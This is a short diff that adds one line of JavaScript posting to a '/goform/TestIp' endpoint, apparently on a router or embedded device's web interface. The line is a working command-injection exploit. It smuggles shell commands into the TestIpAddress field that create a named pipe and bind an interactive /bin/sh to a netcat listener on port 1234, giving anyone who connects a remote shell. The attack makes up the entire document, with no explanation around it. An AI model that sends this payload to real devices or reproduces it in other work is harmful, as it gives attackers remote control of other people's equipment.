@@ -1,0 +1,2 @@
+$.post("/goform/TestIp", {csrf_token: $("#csrf_token").val(), model: '{"TestIpAddress":"; rm -f /dev/myF; mkfifo /dev/myF; cat /dev/myF | /bin/sh -i 2>&1 | nc -l -p 1234 > /dev/myF;","UserType":"1","inputip":1,"TestMode":0}'}, function (data) {console.log(data)})
+
